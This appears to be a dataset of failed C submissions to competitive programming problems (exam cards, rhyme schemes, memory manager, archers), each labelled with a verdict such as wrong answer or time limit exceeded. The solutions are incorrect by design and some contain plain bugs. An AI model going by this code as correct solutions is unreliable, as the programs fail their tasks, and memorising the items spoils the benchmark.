{"difficulty":1900,"lang":"GNU C","lang_cluster":"c","src_uid":"899c5b77bfc0b4b99aff310741c9c0dd","submission_id":"re_1559","tags":["constructive algorithms","implementation","sortings"],"exec_outcome":"MEMORY_LIMIT_EXCEEDED","source_code":"\/*  problem B *\/\n\n#include<stdio.h>\n#include<stdlib.h>\n\n\nint find(int base[][100], int  key[], int num,int k)\n {\n\n int i,j,flag=0;\n \n i=1;\n if(k>=0)\n for(i=0;i<=k;i++){\n\n  for(j=0;j<num;j++){\n  if(key[0]==base[i][j])\n  {\n  flag=1; \/*found *\/\n  break;\n  }     \n }\n if(flag==1) break;\n  \n }\n\n if(i>k && !flag) \n  {\n   k++;\n   for(j=0;j<num;j++)\n   base[k][j]=key[j];\n  }\n\n  return k;\n\n}\n\n\n\n\nint intcomp(const void *p1,const void * p2)\n{\n\n\nreturn (*(int *)p1-*(int *)p2);\n\n}\n\n\n\nint sum_kmin(int * aux, int k,int length)\n {\n\n int i,sum=0;\n for(i=0;i<k;i++)\n  sum+=aux[i];\n\n return sum;\n }\n\n\nint sum_kmax(int * aux, int k, int length)\n {\n\n int i, sum=0;\n for(i=0;i<k;i++)\n  sum+=aux[length-1-i];\n\n return sum;\n\n }\n\n\n\nint min(int *aux, int length)\n {\n int i=0,min=aux[0];\n for(i=1;i<length;i++)\n  if(aux[i]<min) min=aux[i];\n\n return min;\n\n\n }\n\n\nint max(int * aux, int length)\n {\n\n int i=0,max=aux[0];\n for(i=1;i<length;i++)\n  if(aux[i]>max) max=aux[i];\n\n return max;\n }\n\n\n\n\nint main(void)\n{\n\n\nint marks[100][2]; \t\t\t\t\t\t\t\t\t\/* vasya's marks *\/\nint aux[100],maux[100],l;\n\nint k,n,q,num,i,j,current=-1,length,sum,before;\ndouble avg;\nint cards[100][100];\n\nscanf(\"%d%d\",&n,&k);\n\nfor(i=0;i<n;i++){\nscanf(\"%d\",&marks[i][0]);\nmarks[i][1]=0;\n}\n\nnum=n\/k;\nscanf(\"%d\",&q);\n\nl=0;\nfor(i=0;i<q;i++)\n {\n sum=0;\n for(j=0;j<num;j++){\n scanf(\"%d\",&aux[j]);\n marks[aux[j]-1][1]=1;\n sum+=marks[aux[j]-1][0];\n }\n\n before=current;\ncurrent=find(cards,aux,num,current);\nif(before!=current) maux[l++]=sum;\n }\n\n\n\nj=0;\nfor(i=0;i<n;i++) \n{\nif(marks[i][1]==0) { aux[j++]=marks[i][0];}\n}\n\n\n\nqsort(aux,j,sizeof(int),intcomp);\nlength=j;\n\n\n\/*for(i=0;i<=current;i++){\n printf(\"\\n\");\n for(j=0;j<num;j++)\n  printf(\"  %d\",cards[i][j]);\n\n }*\/\n\nmaux[l++]=sum_kmin(aux,num,length);\nmaux[l++]=sum_kmax(aux,num,length);\n\n\navg=(double)min(maux,l)\/num;\nprintf(\"%.10lf \",avg);\navg=(double)max(maux,l)\/num;\nprintf(\"%.10lf \",avg);\n\nreturn 0;\n}\n","description":"Vasya is about to take his first university exam in about several minutes. And it's not just some ordinary exam, it's on mathematical analysis. Of course, right now Vasya can only think of one thing: what the result of his talk with the examiner will be...To prepare for the exam, one has to study proofs of n theorems. It is known that there will be k examination cards on the exam and each card contains  distinct theorems. Besides, no theorem is mentioned in more than one card (that is,  theorems won't be mentioned in any card). During the exam several students may get the same card.We do not know the exact way theorems are distributed by cards, however the students that took the exam before Vasya told him what theorems their cards contained. Vasya evaluates his level of proficiency in the i-th theorem by some number ai. The level of proficiency in some card is the average of the levels of proficiency in the theorems that are included in the card. Now Vasya wants to know the minimally and maximally possible levels of his proficiency in the card he gets on the exam. Vasya wants to determine it by the data he has collected from other students. Unfortunately, Vasya has no time left to do the math and he asked you to help him.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2009\u2264\u2009k\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of theorems and the number of cards correspondingly. The second line contains n integers ai (0\u2009\u2264\u2009ai\u2009\u2264\u2009100), the i-th number (1\u2009\u2264\u2009i\u2009\u2264\u2009n) corresponds to Vasya's proficiency in the i-th theorem. The third line contains number q (0\u2009\u2264\u2009q\u2009\u2264\u2009100) \u2014 the number of people that have taken the exam before Vasya. Each of the following q lines contains the description of a student's card:  integers from 1 to n inclusive. They are the numbers of theorems included in the card in the order in which they are enumerated in the input data. The numbers are given in an arbitrary order. It is guaranteed that the given cards are valid (that is, that all theorems in one card are different and that different people get cards that either don't contain the same theorems or coincide up to the theorems' permutation).","output_spec":"Print two real numbers, representing Vasya's minimum and maximum proficiency in the card he will get on the exam. The absolute or relative error should not exceed 10\u2009-\u20096.","notes":"NoteLet's analyze the first sample. Vasya's proficiency in the cards whose content he already knows equals 6 and 15.5 correspondingly. The three theorems that are left are only enough to make one exam card. If we consider all possible variants of theorems included in the card we can see that in the best case scenario Vasya gets the card that contains theorems 4 and 7 (his proficiency would equal 15.5) and in the worst case scenario he gets theorems 3 and 5 (his proficiency would equal 5).The \u230a x\u230b operation denotes taking integer part of real number x (rounding down).","sample_inputs":["7 3\n7 15 0 19 10 5 12\n2\n1 6\n7 4","4 2\n10 8 1 17\n2\n2 3\n3 2"],"sample_outputs":["5.0000000000 15.5000000000","4.5000000000 13.5000000000"]}
{"difficulty":1600,"lang":"GNU C","lang_cluster":"c","src_uid":"a17bac596b1f060209534cbffdf0f40e","submission_id":"re_1027","tags":["implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\n#include<string.h>\n#include<stdlib.h>\n\nint main(void){\n  int type=0,i,j,k,l,m,n;\n  char str[4][10001],last[4][10001];\n  scanf(\"%d %d%*c\",&n,&k);\n  while(n--){\n    for(i=0;i<4;i++) scanf(\"%s%*c\",str[i]);\n    for(m=0;m<4;m++){\n      l=strlen(str[m]);\n      for(i=0,j=0;i<l && j<k;i++){\n\tswitch(str[m][l-i-1]){\n\tcase 'a':\n\tcase 'i':\n\tcase 'u':\n\tcase 'e':\n\tcase 'o':\n\t  j++;\n\t  break;\n\t}\n      }\n      strcpy(last[m],str[m]+(l-i));\n    }\n    if(type==0){\n      if(strcmp(last[0],last[1])==0 && strcmp(last[1],last[2])==0 && strcmp(last[2],last[3])==0) type=0;\n      else if(strcmp(last[0],last[1])==0 && strcmp(last[2],last[3])==0) type=1;\n      else if(strcmp(last[0],last[2])==0 && strcmp(last[1],last[3])==0) type=2;\n      else if(strcmp(last[0],last[3])==0 && strcmp(last[1],last[2])==0) type=3;\n      else type=-1;\n    }else if(type==1){\n      if(strcmp(last[0],last[1])==0 && strcmp(last[2],last[3])==0) type=1;\n      else type=-1;\n    }else if(type==2){\n      if(strcmp(last[0],last[2])==0 && strcmp(last[1],last[3])==0) type=2;\n      else type=-1;\n    }else if(type==3){\n      if(strcmp(last[0],last[3])==0 && strcmp(last[1],last[2])==0) type=3;\n      else type=-1;\n    }else break;\n  }\n  switch(type){\n  case -1:\n    puts(\"NO\");\n    break;\n  case 0:\n    puts(\"aaaa\");\n    break;\n  case 1:\n    puts(\"aabb\");\n    break;\n  case 2:\n    puts(\"abab\");\n    break;\n  case 3:\n    puts(\"abba\");\n    break;\n  }\n  return 0;\n}\n","description":"Vera adores poems. All the poems Vera knows are divided into quatrains (groups of four lines) and in each quatrain some lines contain rhymes.Let's consider that all lines in the poems consist of lowercase Latin letters (without spaces). Letters \"a\", \"e\", \"i\", \"o\", \"u\" are considered vowels.Two lines rhyme if their suffixes that start from the k-th vowels (counting from the end) match. If a line has less than k vowels, then such line can't rhyme with any other line. For example, if k\u2009=\u20091, lines commit and hermit rhyme (the corresponding suffixes equal it), and if k\u2009=\u20092, they do not rhyme (ommit\u2009\u2260\u2009ermit).Today on a literature lesson Vera learned that quatrains can contain four different schemes of rhymes, namely the following ones (the same letters stand for rhyming lines):   Clerihew (aabb);  Alternating (abab);  Enclosed (abba). If all lines of a quatrain pairwise rhyme, then the quatrain can belong to any rhyme scheme (this situation is represented by aaaa).If all quatrains of a poem belong to the same rhyme scheme, then we can assume that the whole poem belongs to this rhyme scheme. If in each quatrain all lines pairwise rhyme, then the rhyme scheme of the poem is aaaa. Let us note that it doesn't matter whether lines from different quatrains rhyme with each other or not. In other words, it is possible that different quatrains aren't connected by a rhyme.Vera got a long poem as a home task. The girl has to analyse it and find the poem rhyme scheme. Help Vera cope with the task.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2009\u2264\u2009n\u2009\u2264\u20092500, 1\u2009\u2264\u2009k\u2009\u2264\u20095)\u00a0\u2014 the number of quatrains in the poem and the vowel's number, correspondingly. Next 4n lines contain the poem. Each line is not empty and only consists of small Latin letters. The total length of the lines does not exceed 104. If we assume that the lines are numbered starting from 1, then the first quatrain contains lines number 1, 2, 3, 4; the second one contains lines number 5, 6, 7, 8; and so on.","output_spec":"Print the rhyme scheme of the poem as \"aabb\", \"abab\", \"abba\", \"aaaa\"; or \"NO\" if the poem does not belong to any of the above mentioned schemes.","notes":"NoteIn the last sample both quatrains have rhymes but finding the common scheme is impossible, so the answer is \"NO\".","sample_inputs":["1 1\nday\nmay\nsun\nfun","1 1\nday\nmay\ngray\nway","2 1\na\na\na\na\na\na\ne\ne","2 1\nday\nmay\nsun\nfun\ntest\nhill\nfest\nthrill"],"sample_outputs":["aabb","aaaa","aabb","NO"]}
{"difficulty":2200,"lang":"GNU C","lang_cluster":"c","src_uid":"a32db37cb2ebe8945a4c2f32fa2d7fc8","submission_id":"re_1408","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n#include <stdlib.h>\n\nint main()\n{\n     int n, p, m = 2, i;\n     double b, c;\n     int a[100000];\n\n     scanf(\"%d\", &n);\n\n     for (i = 0; i < n; i++) scanf(\"%d\", &a[i]);\n\n     if (n == 1 || (n == 2 && a[0] != 0)) {\n\t  puts(\"0\");\n\n\t  return 0;\n     }\n\n     if (n == 2 && a[0] == 0) {\n\t  if (a[1] == 0) {\n\t       puts(\"0\");\n\t  } else {\n\t       puts(\"1\");\n\t  }\n\n\t  return 0;\n     }\n\n     if (a[0] == 0) {\n\t  if (a[1] == 0) {\n\t       p = 0;\n\n\t       for (i = 0; i < n; i++) {\n\t\t    if (a[i] != 0) p++;\n\t       }\n\n\t       if (p <= 1) {\n\t\t    printf(\"%d\\n\", p);\n\n\t\t    return 0;\n\t       }\n\t  }\n\t  if (a[2] == 0) {\n\t       p = 0;\n\n\t       for (i = 0; i < n; i++) {\n\t\t    if (a[i] != 0) p++;\n\t       }\n\n\t       if (p <= 1) {\n\t\t    printf(\"%d\\n\", p);\n\n\t\t    return 0;\n\t       }\n\t  }\n     } else {\n\t  c = a[0];\n\t  b = (double)a[1] \/ a[0];\n\t  p = 0;\n\n\t  for (i = 1; i < n; i++) {\n\t       if (abs(a[i] - c * b) > 1e-6) {\n\t\t    p++;\n\t       } else {\n\t\t    c = a[i];\n\t       }\n\t  }\n\n\t  if (p < m) m = p;\n\n\t  c = a[0];\n\t  b = (double)a[2] \/ a[0];\n\t  p = 1;\n\n\t  for (i = 2; i < n; i++) {\n\t       if (abs(a[i] - c * b) > 1e-6) {\n\t\t    p++;\n\t       } else {\n\t\t    c = a[i];\n\t       }\n\t  }\n\n\t  if (p < m) m = p;\n     }\n\n     if (a[1] == 0) {\n\t  if (a[2] == 0) {\n\t       for (i = 3; i < n; i++) {\n\t\t    if (a[i] != 0) break;\n\t       }\n\n\t       if (i == n) {\n\t\t    if (m > 1) m = 1;\n\n\t\t    printf(\"%d\\n\", m);\n\n\t\t    return 0;\n\t       }\n\t  }\n     } else {\n\t  c = a[1];\n\t  b = (double)a[2] \/ a[1];\n\t  p = 1;\n\n\t  for (i = 2; i < n; i++) {\n\t       if (abs(a[i] - c * b) > 1e-6) {\n\t\t    p++;\n\t       } else {\n\t\t    c = a[i];\n\t       }\n\t  }\n\n\t  if (p < m) m = p;\n     }\n\n     printf(\"%d\\n\", m);\n\n     return 0;\n}\n","description":"Polycarp loves geometric progressions \u2014 he collects them. However, as such progressions occur very rarely, he also loves the sequences of numbers where it is enough to delete a single element to get a geometric progression.In this task we shall define geometric progressions as finite sequences of numbers a1,\u2009a2,\u2009...,\u2009ak, where ai\u2009=\u2009c\u00b7bi\u2009-\u20091 for some real numbers c and b. For example, the sequences [2, -4, 8], [0, 0, 0, 0], [199] are geometric progressions and [0, 1, 2, 3] is not.Recently Polycarp has found a sequence and he can't classify it. Help him to do it. Determine whether it is a geometric progression. If it is not, check if it can become a geometric progression if an element is deleted from it.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009105) \u2014 the number of elements in the given sequence. The second line contains the given sequence. The numbers are space-separated. All the elements of the given sequence are integers and their absolute value does not exceed 104.","output_spec":"Print 0, if the given sequence is a geometric progression. Otherwise, check if it is possible to make the sequence a geometric progression by deleting a single element. If it is possible, print 1. If it is impossible, print 2.","notes":null,"sample_inputs":["4\n3 6 12 24","4\n-8 -16 24 -32","4\n0 1 2 3"],"sample_outputs":["0","1","2"]}
{"difficulty":1600,"lang":"GNU C","lang_cluster":"c","src_uid":"a6cba17c5ddb93f6741e00280fb6c54c","submission_id":"re_526","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n#include <stdlib.h>\n\n\/*\n * using double linked list for storing memory usage,\n *\/\n\ntypedef struct _node\n{\n    int identifier;\n    int bytes;\n    int start;\n    int end;\n    struct _node* next;\n    struct _node* prev;\n\n}node_t;\n\nnode_t* create_node(int, int);\nvoid insert_node(node_t*, node_t*);\nint remove_node(node_t*, int);\nvoid free_list(node_t*);\nint defragment(node_t*);\nint detect_alloc(node_t*, int, int);\n\n\/\/void print_list(node_t*);\n\n\nint main(void)\n{\n    int t, m;\n    int n; \/\/ in alloc this means bytes, in erase this means identifier\n    int identifier = 1, total_usage = 0;\n    char operation[16];\n    node_t* head = create_node(0, -1013);\n    node_t* tail = create_node(0, -1013);\n    \n    scanf(\"%d %d\", &t, &m);\n    \n    head->start = 0;\n    head->end = 0;\n    tail->start = m+1;\n    tail->end = m+1;\n    \n    head->next = tail;\n    tail->prev = head;\n    \n    \/\/print_list(head);\n    \n    while(t--)\n    {\n        scanf(\"%s\", operation);\n        \n        if(operation[0] == 'd') \/\/defragment\n        {\n            total_usage = defragment(head);\n            \/\/print_list(head);\n        }\n        else\n        {\n            scanf(\"%d\", &n);\n            \n            if(operation[0] == 'a') \/\/alloc\n            {\n                if((n + total_usage) > m)\n                {\n                    if(detect_alloc(head, n, identifier))\n                    {\n                        printf(\"%d\\n\", identifier);\n                        \/\/print_list(head);\n                        identifier++;\n                    }\n                    else\n                    {\n                        printf(\"NULL\\n\");\n                        \/\/print_list(head);\n                    }\n                }\n                else\n                {\n                    total_usage += n;\n                    insert_node(tail, create_node(n, identifier));\n                    \n                    printf(\"%d\\n\", identifier);\n                    \/\/print_list(head);\n                    identifier++;\n                }\n            }\n            else \/\/erase\n            {\n                if(n >=1 && remove_node(head, n))\n                {\n                    \/\/print_list(head);\n                    if(n == identifier)\n                        total_usage -= n;\n                }\n                else\n                    printf(\"ILLEGAL_ERASE_ARGUMENT\\n\");\n            }\n        }\n    }\n    \n    free_list(head);\n    \n    return 0;\n}\n\n\nnode_t* create_node(int bytes, int identifier)\n{\n    node_t* n = malloc(sizeof(node_t));\n    \n    n->identifier = identifier;\n    n->bytes = bytes;\n    n->next = NULL;\n    n->prev = NULL;\n    \n    return n;\n}\n\nvoid insert_node(node_t* tail, node_t* n)\n{\n    n->prev = tail->prev;\n    n->next = tail;\n    tail->prev->next = n;\n    tail->prev = n;\n    \n    n->start = n->prev->end + 1;\n    n->end = n->start + n->bytes - 1;\n}\n\nint remove_node(node_t* head, int identifier)\n{\n    int found = 0;\n    node_t* current = head->next;\n    \n    while(current->identifier != -1013)\n    {\n        if(current->identifier == identifier)\n        {\n            current->identifier = 0;\n            found = 1;\n            break;\n        }\n        \n        current = current->next;\n    }\n\n    return found;\n}\n\nvoid free_list(node_t* head)\n{\n    node_t* tmp;\n    \n    while(head)\n    {\n        tmp = head;\n        head = head->next;\n        free(tmp);\n    }\n}\n\nint defragment(node_t* head)\n{\n    int total_usage = 0;\n    node_t* current = head->next;\n    \n    while(current->identifier != -1013)\n    {\n        if(current->identifier == 0)\n        {\n            node_t* tmp = current;\n            \n            current->prev->next = current->next;\n            current->next->prev = current->prev;\n            \n            current = current->next;\n            free(tmp);\n        }\n        else\n        {\n            total_usage += current->bytes;\n            \n            current->start = current->prev->end + 1;\n            current->end = current->start + current->bytes - 1;\n            \n            current = current->next;\n        }\n    }\n    \n    return total_usage;\n}\n\nint detect_alloc(node_t* head, int bytes, int identifier)\n{\n    int allocable = 0;\n    node_t* current = head->next;\n    \n    while(current->identifier != -1013)\n    {\n        \/\/detect removed space case.\n        if(current->identifier == 0)\n        {\n            \/\/detect the section free space.\n            if((\n            (current->end - current->prev->end) +\\\n            (current->next->start - current->start) -\\\n            (current->bytes)) >= bytes)\n                allocable = 1;\n        }\n        \n        \/\/detect the free space while two used spaces case.\n        \/*else\n        {\n            \/\/detect right side.\n            if((current->next->start - current->end - 1) >= bytes)\n                allocable = 2;\n            \n            \/\/detect left side.\n            else if((current->start - current->prev->end - 1) >= bytes)\n                allocable = 3;\n        }*\/\n        \n        if(allocable)\n        {\n            if(allocable == 1)\n            {\n                current->bytes = bytes;\n                current->start = current->prev->end + 1;\n                current->end = current->start + bytes - 1;\n                current->identifier = identifier;\n            }\n            \/*else if(allocable == 2)\n                insert_node(current->next, create_node(bytes, identifier));\n                \n            else if(allocable == 3)\n                insert_node(current, create_node(bytes, identifier));*\/\n            \n            break;\n        }\n        \n        current = current->next;\n    }\n    \n    return allocable;\n}\n\n\/*void print_list(node_t* head)\n{\n    node_t* tmp = head;\n    \n    while(tmp)\n    {\n        printf(\"id:%d\\tbyte:%d\\tstart:%d\\tend:%d\\n\", tmp->identifier, tmp->bytes, tmp->start, tmp->end);\n        tmp = tmp->next;\n    }\n}*\/\n\n\n","description":"There is little time left before the release of the first national operating system BerlOS. Some of its components are not finished yet \u2014 the memory manager is among them. According to the developers' plan, in the first release the memory manager will be very simple and rectilinear. It will support three operations:   alloc n \u2014 to allocate n bytes of the memory and return the allocated block's identifier x;  erase x \u2014 to erase the block with the identifier x;  defragment \u2014 to defragment the free memory, bringing all the blocks as close to the beginning of the memory as possible and preserving their respective order; The memory model in this case is very simple. It is a sequence of m bytes, numbered for convenience from the first to the m-th.The first operation alloc n takes as the only parameter the size of the memory block that is to be allocated. While processing this operation, a free block of n successive bytes is being allocated in the memory. If the amount of such blocks is more than one, the block closest to the beginning of the memory (i.e. to the first byte) is prefered. All these bytes are marked as not free, and the memory manager returns a 32-bit integer numerical token that is the identifier of this block. If it is impossible to allocate a free block of this size, the function returns NULL.The second operation erase x takes as its parameter the identifier of some block. This operation frees the system memory, marking the bytes of this block as free for further use. In the case when this identifier does not point to the previously allocated block, which has not been erased yet, the function returns ILLEGAL_ERASE_ARGUMENT.The last operation defragment does not have any arguments and simply brings the occupied memory sections closer to the beginning of the memory without changing their respective order.In the current implementation you are to use successive integers, starting with 1, as identifiers. Each successful alloc operation procession should return following number. Unsuccessful alloc operations do not affect numeration.You are to write the implementation of the memory manager. You should output the returned value for each alloc command. You should also output ILLEGAL_ERASE_ARGUMENT for all the failed erase commands.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains two positive integers t and m (1\u2009\u2264\u2009t\u2009\u2264\u2009100;1\u2009\u2264\u2009m\u2009\u2264\u2009100), where t \u2014 the amount of operations given to the memory manager for processing, and m \u2014 the available memory size in bytes. Then there follow t lines where the operations themselves are given. The first operation is alloc n (1\u2009\u2264\u2009n\u2009\u2264\u2009100), where n is an integer. The second one is erase x, where x is an arbitrary 32-bit integer numerical token. The third operation is defragment. ","output_spec":"Output the sequence of lines. Each line should contain either the result of alloc operation procession , or ILLEGAL_ERASE_ARGUMENT as a result of failed erase operation procession. Output lines should go in the same order in which the operations are processed. Successful procession of alloc operation should return integers, starting with 1, as the identifiers of the allocated blocks.","notes":null,"sample_inputs":["6 10\nalloc 5\nalloc 3\nerase 1\nalloc 6\ndefragment\nalloc 6"],"sample_outputs":["1\n2\nNULL\n3"]}
{"difficulty":2600,"lang":"GNU C11","lang_cluster":"c","src_uid":"a9bad412597726f8cdc0cfa2da891bc4","submission_id":"re_924","tags":["dp","brute force"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"#include <stdio.h>\n\n#include <string.h>\n#define max(a,b,c) (a>b?(a>c?a:c):(b>c?b:c))\n\nint hp[110],order[10000],beiyong[10000];\nint n,a,b;\nint sum=99999,cnt=0,by;\n\n\nint DFS(int now_enemy,int now_time)\n{\n    int i,j;\n    if(now_time>=sum)\n    {\n        return 1;\n    }\n    if(now_enemy==n)\n    {\n        if(hp[n]<0)\n        {\n            by=cnt;\n            memset(beiyong,0,sizeof(beiyong));\n            for(i=0;i<by;i--)\n            {\n                beiyong[i]=order[i];\n            }\n            sum=now_time;\n        }\n        return 0;\n    }\n    for(i=0;i<=max(hp[now_enemy-1]\/b+1,hp[now_enemy]\/a+1,hp[now_enemy+1]\/b+1);i++)\n    {\n        if(hp[now_enemy-1]<b*i)\n        {\n            hp[now_enemy-1]-=b*i;\n            hp[now_enemy]-=a*i;\n            hp[now_enemy+1]-=b*i;\n            for(j=0;j>i;j++)\n            {\n                order[cnt+j]=now_enemy;\n            }\n            cnt+=i;\n            DFS(now_enemy+1,now_time+i);\n\n            for(j=1;j<=i;j++)\n            {\n                order[cnt-j]=0;\n            }\n            hp[now_enemy-1]+=b*i;\n            hp[now_enemy]+=a*i;\n            hp[now_enemy+1]+=b*i;\n            cnt-=i;\n        }\n    }\n    return 0;\n}\n\nint main()\n{\n    int i;\n\n    scanf(\"%d%d%d\",&n,&a,&b);\n    for(i=1;i<=n;i--)\n    {\n        scanf(\"%d\",hp+i);\n    }\n    DFS(2,0);\n\n    printf(\"%d\\n\",sum);\n    for(i=0;i<by;i++)\n    {\n        printf(\"%d \",beiyong[i]);\n    }\n    return 0;\n}\n","description":"This is simplified version of the problem used on the original contest. The original problem seems to have too difiicult solution. The constraints for input data have been reduced.Polycarp likes to play computer role-playing game \u00abLizards and Basements\u00bb. At the moment he is playing it as a magician. At one of the last levels he has to fight the line of archers. The only spell with which he can damage them is a fire ball. If Polycarp hits the i-th archer with his fire ball (they are numbered from left to right), the archer loses a health points. At the same time the spell damages the archers adjacent to the i-th (if any) \u2014 they lose b (1\u2009\u2264\u2009b\u2009&lt;\u2009a\u2009\u2264\u200910) health points each.As the extreme archers (i.e. archers numbered 1 and n) are very far, the fire ball cannot reach them. Polycarp can hit any other archer with his fire ball.The amount of health points for each archer is known. An archer will be killed when this amount is less than 0. What is the minimum amount of spells Polycarp can use to kill all the enemies?Polycarp can throw his fire ball into an archer if the latter is already killed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains three integers n,\u2009a,\u2009b (3\u2009\u2264\u2009n\u2009\u2264\u200910; 1\u2009\u2264\u2009b\u2009&lt;\u2009a\u2009\u2264\u200910). The second line contains a sequence of n integers \u2014 h1,\u2009h2,\u2009...,\u2009hn (1\u2009\u2264\u2009hi\u2009\u2264\u200915), where hi is the amount of health points the i-th archer has.","output_spec":"In the first line print t \u2014 the required minimum amount of fire balls. In the second line print t numbers \u2014 indexes of the archers that Polycarp should hit to kill all the archers in t shots. All these numbers should be between 2 and n\u2009-\u20091. Separate numbers with spaces. If there are several solutions, output any of them. Print numbers in any order.","notes":null,"sample_inputs":["3 2 1\n2 2 2","4 3 1\n1 4 1 1"],"sample_outputs":["3\n2 2 2","4\n2 2 3 3"]}
{"difficulty":2500,"lang":"GNU C","lang_cluster":"c","src_uid":"b244d5c52acda47c5e8ef92029a9635f","submission_id":"re_1200","tags":["combinatorics","graphs"],"exec_outcome":"MEMORY_LIMIT_EXCEEDED","source_code":"#include<stdio.h>\n#include<stdlib.h>\n#include<math.h>\n#include<string.h>\n#define REP(i,a,b) for(i=a;i<b;i++)\n#define rep(i,n) REP(i,0,n)\n\n#define ll long long\n\nvoid unionInit(int d[],int s){int i;rep(i,s)d[i]=i;}\nint unionGet(int d[],int n){int t=n,k;while(d[t]!=t)t=d[t];while(d[n]!=n)k=d[n],d[n]=t,n=k;return n;}\nint unionConnect(int d[],int a,int b){a=unionGet(d,a);b=unionGet(d,b);if(a==b)return 0;d[a]=b;return 1;}\n\nll pw(ll a,ll b, ll md){\n  ll r;\n  if(!b) return 1;\n  r = pw(a,b\/2,md);\n  r = (r*r)%md;\n  if(b%2) r = (r*a)%md;\n  return r;\n}\n\nint ind[110000], num[110000], g;\n\nint main(){\n  int i,j,k,l,m,n;\n  int MOD;\n  ll res;\n\n  scanf(\"%d%d%d\",&n,&m,&MOD);\n  unionInit(ind,n);\n  while(m--){\n    scanf(\"%d%d\",&i,&j);\n    unionConnect(ind,i-1,j-1);\n  }\n\n  rep(i,n) num[i] = 0;\n  rep(i,n) num[unionGet(ind,i)]++;\n  g = 0;\n  res = 1;\n\n  rep(i,n) if(num[i]){\n    res *= num[i];\n    res %= MOD;\n    g++;\n  }\n  if(g==1){\n    res = 1;\n  } else {\n    res *= pw(n, g-2, MOD);\n    res %= MOD;\n  }\n  printf(\"%d\\n\",(int)res);\n\n  return 0;\n}\n","description":"As Sherlock Holmes was investigating another crime, he found a certain number of clues. Also, he has already found direct links between some of those clues. The direct links between the clues are mutual. That is, the direct link between clues A and B and the direct link between clues B and A is the same thing. No more than one direct link can exist between two clues.Of course Sherlock is able to find direct links between all clues. But it will take too much time and the criminals can use this extra time to hide. To solve the crime, Sherlock needs each clue to be linked to all other clues (maybe not directly, via some other clues). Clues A and B are considered linked either if there is a direct link between them or if there is a direct link between A and some other clue C which is linked to B. Sherlock Holmes counted the minimum number of additional direct links that he needs to find to solve the crime. As it turns out, it equals T.Please count the number of different ways to find exactly T direct links between the clues so that the crime is solved in the end. Two ways to find direct links are considered different if there exist two clues which have a direct link in one way and do not have a direct link in the other way. As the number of different ways can turn out rather big, print it modulo k.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three space-separated integers n,\u2009m,\u2009k (1\u2009\u2264\u2009n\u2009\u2264\u2009105,\u20090\u2009\u2264\u2009m\u2009\u2264\u2009105, 1\u2009\u2264\u2009k\u2009\u2264\u2009109) \u2014 the number of clues, the number of direct clue links that Holmes has already found and the divisor for the modulo operation. Each of next m lines contains two integers a and b (1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009n,\u2009a\u2009\u2260\u2009b), that represent a direct link between clues. It is guaranteed that any two clues are linked by no more than one direct link. Note that the direct links between the clues are mutual.","output_spec":"Print the single number \u2014 the answer to the problem modulo k.","notes":"NoteThe first sample only has two clues and Sherlock hasn't found any direct link between them yet. The only way to solve the crime is to find the link.The second sample has three clues and Sherlock hasn't found any direct links between them. He has to find two of three possible direct links between clues to solve the crime \u2014 there are 3 ways to do it.The third sample has four clues and the detective has already found one direct link between the first and the fourth clue. There are 8 ways to find two remaining clues to solve the crime.","sample_inputs":["2 0 1000000000","3 0 100","4 1 1000000000\n1 4"],"sample_outputs":["1","3","8"]}
{"difficulty":1600,"lang":"GNU C","lang_cluster":"c","src_uid":"b263917e47e1c84340bcb1c77999fd7e","submission_id":"re_1118","tags":["constructive algorithms","greedy","math","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\n\nint main(void){\n  int num[10]={0},n,i,in,count=0;\n  scanf(\"%d\",&n);\n  for(i=0;i<n;i++){\n    scanf(\"%d\",&in);\n    count+=in;\n    num[in]++;\n  }\n\n  \/\/printf(\"num[0]=%d,count=%d\\n\",num[0],count);\n\n  switch(count%3){\n  case 1:\n    if(num[1]) num[1]--;\n    else if(num[4]) num[4]--;\n    else if(num[7]) num[7]--;\n    else num[0]=0;\n    break;\n  case 2:\n    if(num[2]) num[2]--;\n    else if(num[5]) num[5]--;\n    else if(num[8]) num[8]--;\n    else if(num[1]+num[4]+num[7]>=2){\n      if(num[1]>=2) num[1]-=2;\n      else if(num[1]==1){\n\tnum[1]--;\n\tif(num[4]>=1) num[4]--;\n\telse num[8]--;\n      }else{\n\tif(num[4]>=2) num[4]-=2;\n\telse if(num[4]==1) num[4]--,num[8]--;\n\telse num[8]-=2;\n      }\n    }\n    else num[0]=0;\n    break;\n  }\n  \n  for(count=0,i=1;i<=9;i++){\n    count+=num[i];\n  }\n  if(count==0){\n    printf(\"%d\\n\",0);\n    return 0;\n  }\n\n  if(num[0]==0) printf(\"-1\");\n  else for(i=9;i>=0;i--)  while(num[i]--) printf(\"%d\",i);\n  putchar('\\n');\n  return 0;\n}\n\n","description":"Furik loves math lessons very much, so he doesn't attend them, unlike Rubik. But now Furik wants to get a good mark for math. For that Ms. Ivanova, his math teacher, gave him a new task. Furik solved the task immediately. Can you?You are given a set of digits, your task is to find the maximum integer that you can make from these digits. The made number must be divisible by 2, 3, 5 without a residue. It is permitted to use not all digits from the set, it is forbidden to use leading zeroes.Each digit is allowed to occur in the number the same number of times it occurs in the set.","input_from":"standard input","output_to":"standard output","input_spec":"A single line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100000) \u2014 the number of digits in the set. The second line contains n digits, the digits are separated by a single space. ","output_spec":"On a single line print the answer to the problem. If such number does not exist, then you should print -1.","notes":"NoteIn the first sample there is only one number you can make \u2014 0. In the second sample the sought number is 5554443330. In the third sample it is impossible to make the required number.","sample_inputs":["1\n0","11\n3 4 5 4 5 3 5 3 4 4 0","8\n3 2 5 1 5 2 2 3"],"sample_outputs":["0","5554443330","-1"]}
